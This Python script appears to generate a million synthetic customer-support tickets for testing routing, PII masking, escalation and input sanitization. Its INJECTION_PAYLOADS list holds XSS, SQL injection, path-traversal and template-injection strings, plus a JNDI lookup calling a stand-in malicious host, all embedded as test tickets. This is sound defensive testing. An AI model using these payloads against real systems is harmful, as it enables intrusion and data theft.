import random
import re
import json
import os
import itertools
from typing import Generator, Dict, Any

SEED = 42
random.seed(SEED)

# Vocabulary and fragment pools for combinatorial synthesis

NAMES = ["Alex", "Jordan", "Taylor", "Morgan", "Sam", "Chris", "Pat", "Riley", "Casey", "Dakota", "Jamie", "Robin"]
DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com", "corporate.net", "enterprise.org"]

BILLING_ACTIONS = [
    "I was charged twice on my credit card statement for order {order_id}",
    "Please send me the formal tax invoice and receipt for order {order_id}",
    "My credit card shows an unauthorized deduction of ${amt} from your store",
    "Why was my account billed twice for the annual subscription?",
    "Need to update the payment method and billing zip code on my profile",
    "I returned the parcel two weeks ago but haven't received my credit of ${amt}",
    "The promotional discount coupon was not applied to my checkout total",
    "Double charge dispute regarding invoice #INV-{order_num}"
]

FULFILLMENT_ACTIONS = [
    "Where is my package? The tracking number {tracking} has not updated in 5 days",
    "The delivery driver left the parcel in the rain and the contents are water damaged",
    "Carrier FedEx tracking {tracking} says delivered to porch, but nothing is outside",
    "I received the package for order {order_id} but only 2 of the 4 items were inside",
    "Please update my shipping delivery address for order {order_id}",
    "DHL customs clearance in Frankfurt is holding my international shipment",
    "Package arrived with crushed box and broken items inside order {order_id}",
    "The tracking code {tracking} gives an invalid tracking number error on courier site"
]

TECHNICAL_ACTIONS = [
    "When I click the 'Complete Checkout' button, the screen displays Error 500",
    "I am locked out of my customer profile. The password reset token link has expired",
    "The iOS mobile application crashes immediately when opening the cart page",
    "The search bar on your website returns 404 Not Found when browsing accessories",
    "The SMS two-factor authentication verification code is never delivered to my phone",
    "Unable to redeem my digital gift card code at checkout due to gateway timeout",
    "Product images are failing to render on Chrome desktop browser version 128",
    "Javascript unhandled TypeError exception in console when selecting size L"
]

GENERAL_ACTIONS = [
    "Do you offer wholesale pricing or commercial bulk discounts for orders over 100 units?",
    "What are the exact chest and sleeve measurements for the size Medium jacket?",
    "When will the sold-out canvas weekender bag be restocked in navy blue?",
    "Are your skincare formulas vegan, paraben-free, and cruelty-free certified?",
    "Do you have a physical retail flagship store in Chicago where I can try items?",
    "What is your standard warranty and replacement policy for electronics?",
    "Do you ship internationally to New Zealand and what are the duty thresholds?",
    "Can you provide the material safety data sheet (MSDS) for the cleaner?"
]

KILL_SWITCH_TRIGGERS = [
    "I am contacting my lawyer and reporting your company for credit card fraud.",
    "If this is not resolved today, I will file a formal complaint with the Better Business Bureau (BBB).",
    "I will initiate a bank chargeback with Chase and report you to the Federal Trade Commission.",
    "This is blatant consumer fraud and theft. My attorney will be in touch tomorrow morning.",
    "I am reporting this illegal unauthorized charge to the police department fraud division.",
    "You leave me no choice but to sue your business in small claims court.",
    "This is completely unacceptable fraud. I demand an immediate resolution before legal action."
]

PII_CREDIT_CARDS = [
    "4111-2222-3333-4444", "4532 8901 2345 6789", "5425-1234-5678-9012",
    "3782 822463 10005", "6011-0009-8877-6655", "4000123456789010"
]

PII_PHONES = [
    "+1 (555) 234-5678", "212-555-0199", "+44 20 7946 0912",
    "415.555.2671", "(800) 555-0143", "+61 2 9374 4000"
]

INJECTION_PAYLOADS = [
    "<script>alert('pwned')</script>",
    "<img src=x onerror=alert('xss')>",
    "'; DROP TABLE tickets; --",
    "' OR '1'='1",
    "../../../../etc/passwd",
    "{{7*7}}",
    "${jndi:ldap://malicious-server.com/exploit}",
    "<svg/onload=alert('injection')>"
]

TYPO_SUBS = {
    "refund": "refun",
    "package": "pakage",
    "shipping": "shippin",
    "delivery": "delivry",
    "charged": "chargd",
    "broken": "brokn",
    "please": "plz",
    "thanks": "thx",
    "immediately": "immediatly"
}

def inject_typos(text: str) -> str:
    words = text.split()
    new_words = []
    for w in words:
        clean_w = w.lower().strip(".,!?:")
        if clean_w in TYPO_SUBS and random.random() < 0.6:
            new_words.append(TYPO_SUBS[clean_w])
        else:
            new_words.append(w)
    return " ".join(new_words)

def generate_ticket_stream(total_count: int = 1_000_000) -> Generator[Dict[str, Any], None, None]:
    """
    High-performance generator streaming 1,000,000 synthetic tickets
    across 8 realistic operational partitions.
    """
    # Partition allocations
    p1_count = int(total_count * 0.40) # 400,000: Baseline Clean
    p2_count = int(total_count * 0.15) # 150,000: Adversarial PII Infiltration
    p3_count = int(total_count * 0.10) # 100,000: Kill-Switch & Legal Escalations
    p4_count = int(total_count * 0.15) # 150,000: Refund Intent & Return Window Boundaries
    p5_count = int(total_count * 0.10) # 100,000: Real-World Messy & OCR Noise
    p6_count = int(total_count * 0.05) # 50,000:  Low Confidence & Ambiguity Gate
    p7_count = int(total_count * 0.025)# 25,000:  Security Payloads & Injection Attacks
    p8_count = total_count - (p1_count + p2_count + p3_count + p4_count + p5_count + p6_count + p7_count) # 25,000: Extreme Payload & Burst

    global_id = 1

    # =========================================================================
    # PARTITION 1: BASELINE CLEAN TICKETS (400,000)
    # Balanced evenly across Billing, Fulfillment, Technical, General
    # =========================================================================
    dept_templates = [
        ("Billing", BILLING_ACTIONS),
        ("Fulfillment", FULFILLMENT_ACTIONS),
        ("Technical", TECHNICAL_ACTIONS),
        ("General", GENERAL_ACTIONS)
    ]
    per_dept = p1_count // 4

    for dept, templates in dept_templates:
        for _ in range(per_dept):
            t_num = random.randint(1000, 99999)
            o_id = f"#{t_num}"
            amt = round(random.uniform(20.0, 450.0), 2)
            trk = f"1Z{random.randint(10000000, 99999999)}{random.randint(10000000, 99999999)}"
            tmpl = random.choice(templates)
            body = tmpl.format(order_id=o_id, order_num=t_num, amt=amt, tracking=trk)
            tier = "VIP" if random.random() < 0.12 else "Standard"

            yield {
                "ticket_id": f"TICK-{global_id:07d}",
                "partition": "P1_BASELINE_CLEAN",
                "department": dept,
                "text": body,
                "customer_tier": tier,
                "order_id": o_id if "#" in body else None,
                "has_pii": False,
                "has_kill_switch": False,
                "expected_route": f"{dept}_Team",
                "refund_intent": "refund" in body.lower() or "charged" in body.lower()
            }
            global_id += 1

    # =========================================================================
    # PARTITION 2: ADVERSARIAL PII INFILTRATION (150,000)
    # Tests in-flight credit card, phone, and email masking
    # =========================================================================
    for _ in range(p2_count):
        cc = random.choice(PII_CREDIT_CARDS)
        ph = random.choice(PII_PHONES)
        em = f"{random.choice(NAMES).lower()}.{random.randint(10,999)}@{random.choice(DOMAINS)}"
        o_id = f"#{random.randint(1000, 99999)}"
        dept = random.choice(["Billing", "Fulfillment"])

        templates = [
            f"My credit card {cc} was billed for order {o_id}. Please call me at {ph} or reach out to {em}.",
            f"Please update my contact phone {ph} and my card ending {cc[-4:]} for order {o_id}.",
            f"I have a query on transaction {cc} for {o_id}. Confirm with me at {em}."
        ]
        body = random.choice(templates)
        tier = "VIP" if random.random() < 0.15 else "Standard"

        yield {
            "ticket_id": f"TICK-{global_id:07d}",
            "partition": "P2_PII_INFILTRATION",
            "department": dept,
            "text": body,
            "customer_tier": tier,
            "order_id": o_id,
            "has_pii": True,
            "has_kill_switch": False,
            "expected_route": f"{dept}_Team",
            "refund_intent": False
        }
        global_id += 1

    # =========================================================================
    # PARTITION 3: KILL-SWITCH & REGULATORY ESCALATIONS (100,000)
    # High-liability legal threats forcing Urgency 3 & 15-min SLA
    # =========================================================================
    for _ in range(p3_count):
        o_id = f"#{random.randint(1000, 99999)}"
        ks = random.choice(KILL_SWITCH_TRIGGERS)
        base = random.choice(BILLING_ACTIONS).format(order_id=o_id, order_num=o_id[1:], amt=129.0, tracking="1Z1234567890123456")
        body = f"{base} {ks}"
        tier = "VIP" if random.random() < 0.20 else "Standard"

        yield {
            "ticket_id": f"TICK-{global_id:07d}",
            "partition": "P3_KILL_SWITCH_ESCALATIONS",
            "department": "Billing",
            "text": body,
            "customer_tier": tier,
            "order_id": o_id,
            "has_pii": False,
            "has_kill_switch": True,
            "expected_route": "VIP_ESCALATIONS" if tier == "VIP" else "URGENT_ESCALATIONS",
            "refund_intent": True
        }
        global_id += 1

    # =========================================================================
    # PARTITION 4: REFUND INTENT & RETURN WINDOW BOUNDARIES (150,000)
    # Mathematical validation of return eligibility policies
    # =========================================================================
    # 5 boundary conditions:
    # 1. Delivered 3 days ago -> Eligible
    # 2. Delivered 29 days ago -> Eligible
    # 3. Delivered 31 days ago -> Ineligible (Outside Window)
    # 4. Final Sale item -> Ineligible (Final Sale)
    # 5. In-Transit / Processing -> Ineligible (Not Delivered)
    boundary_cases = [
        ("#84920", True, "ELIGIBLE_FOR_RETURN_OR_REFUND"),
        ("#1001", True, "ELIGIBLE_FOR_RETURN_OR_REFUND"),
        ("#1002", False, "OUTSIDE_RETURN_WINDOW"),
        ("#1003", False, "FINAL_SALE_EXCLUDED"),
        ("#1004", False, "ORDER_NOT_DELIVERED_PROCESSING")
    ]

    for _ in range(p4_count):
        o_id, exp_elig, exp_reason = random.choice(boundary_cases)
        amt = round(random.uniform(35.0, 250.0), 2)
        phrases = [
            f"I want to return item for order {o_id} and get a full refund of ${amt}.",
            f"Please cancel and refund order {o_id} immediately.",
            f"The item for order {o_id} does not fit. I need a refund."
        ]
        body = random.choice(phrases)
        tier = "VIP" if o_id in ["#84920", "#1004"] else "Standard"

        yield {
            "ticket_id": f"TICK-{global_id:07d}",
            "partition": "P4_RETURN_WINDOW_POLICY",
            "department": "Billing",
            "text": body,
            "customer_tier": tier,
            "order_id": o_id,
            "has_pii": False,
            "has_kill_switch": False,
            "expected_eligibility": exp_elig,
            "expected_reason": exp_reason,
            "expected_route": "Billing_Team",
            "refund_intent": True
        }
        global_id += 1

    # =========================================================================
    # PARTITION 5: REAL-WORLD MESSY / TYPOS / ALL-CAPS RAGE (100,000)
    # Noise, grammatical omissions, and punctuation extremes
    # =========================================================================
    for _ in range(p5_count):
        dept, templates = random.choice(dept_templates)
        tmpl = random.choice(templates)
        o_id = f"#{random.randint(1000, 99999)}"
        amt = round(random.uniform(25.0, 300.0), 2)
        trk = f"1Z{random.randint(10000000, 99999999)}{random.randint(10000000, 99999999)}"
        raw_body = tmpl.format(order_id=o_id, order_num=o_id[1:], amt=amt, tracking=trk)

        noise_mode = random.choice(["typos", "caps", "punctuation", "emojis"])
        if noise_mode == "typos":
            body = inject_typos(raw_body)
        elif noise_mode == "caps":
            body = raw_body.upper() + "!!!!!!"
        elif noise_mode == "punctuation":
            body = raw_body.replace(".", "???!!!") + " respond asap"
        else:
            body = "😡 " + raw_body + " 💔📦"

        tier = "VIP" if random.random() < 0.12 else "Standard"

        yield {
            "ticket_id": f"TICK-{global_id:07d}",
            "partition": "P5_REAL_WORLD_NOISE",
            "department": dept,
            "text": body,
            "customer_tier": tier,
            "order_id": o_id if "#" in body else None,
            "has_pii": False,
            "has_kill_switch": False,
            "expected_route": f"{dept}_Team",
            "refund_intent": "refund" in body.lower()
        }
        global_id += 1

    # =========================================================================
    # PARTITION 6: LOW CONFIDENCE & AMBIGUITY GATE (50,000)
    # Ambiguous inputs that MUST trigger the Confidence Gate (< 0.85)
    # =========================================================================
    ambiguous_texts = [
        "Hello can you help me?",
        "Please check my account status.",
        "Update on my ticket please.",
        "I have a quick question about something.",
        "Need assistance with my recent activity.",
        "Can an agent contact me regarding my file?",
        "asdfghjkl qwertyuiop support please"
    ]

    for _ in range(p6_count):
        body = random.choice(ambiguous_texts)
        tier = "Standard"

        yield {
            "ticket_id": f"TICK-{global_id:07d}",
            "partition": "P6_AMBIGUITY_GATE",
            "department": "Unknown",
            "text": body,
            "customer_tier": tier,
            "order_id": None,
            "has_pii": False,
            "has_kill_switch": False,
            "expected_gate_triggered": True,
            "expected_route": "HUMAN_TRIAGE",
            "refund_intent": False
        }
        global_id += 1

    # =========================================================================
    # PARTITION 7: SECURITY PAYLOADS & INJECTION ATTACKS (25,000)
    # Verifies sanitization against XSS, SQLi, and Template Injections
    # =========================================================================
    for _ in range(p7_count):
        inj = random.choice(INJECTION_PAYLOADS)
        body = f"Where is order #84920? Tracking query: {inj}"
        tier = "Standard"

        yield {
            "ticket_id": f"TICK-{global_id:07d}",
            "partition": "P7_SECURITY_INJECTION",
            "department": "Fulfillment",
            "text": body,
            "customer_tier": tier,
            "order_id": "#84920",
            "has_pii": False,
            "has_kill_switch": False,
            "expected_route": "Fulfillment_Team",
            "refund_intent": False
        }
        global_id += 1

    # =========================================================================
    # PARTITION 8: EXTREME PAYLOAD & BURST TRAFFIC (25,000)
    # Micro-tickets and gigantic copy-pasted email threads
    # =========================================================================
    email_thread_filler = (
        " On Mon, Oct 12, Support Team wrote:\n"
        "> Thank you for contacting our customer care department. Your reference is #84920.\n"
        "> Please review the attached terms and warranty policy.\n"
    ) * 15

    for _ in range(p8_count):
        if random.random() < 0.5:
            # Gigantic email thread
            body = f"Order #84920 package delayed in shipping.{email_thread_filler}"
        else:
            # Micro ticket (single word)
            body = random.choice(["Broken", "Late", "Invoice", "Help", "Refund"])

        dept = "Billing" if "Refund" in body or "Invoice" in body else "Fulfillment"

        yield {
            "ticket_id": f"TICK-{global_id:07d}",
            "partition": "P8_EXTREME_PAYLOAD",
            "department": dept,
            "text": body,
            "customer_tier": "Standard",
            "order_id": "#84920" if "#" in body else None,
            "has_pii": False,
            "has_kill_switch": False,
            "expected_route": f"{dept}_Team",
            "refund_intent": "refund" in body.lower()
        }
        global_id += 1

def main():
    print("[*] Generating 5,000-ticket representative sample for inspection...")
    sample_path = os.path.join(os.path.dirname(__file__), "sample_synthetic_tickets.json")
    stream = generate_ticket_stream(5000)
    sample_tickets = list(stream)

    with open(sample_path, "w", encoding="utf-8") as f:
        json.dump(sample_tickets, f, indent=2)

    print(f"[+] Sample written to {sample_path}")
    print("[i] 1,000,000 ticket streaming generator is ready for live operational simulation.")

if __name__ == "__main__":
    main()
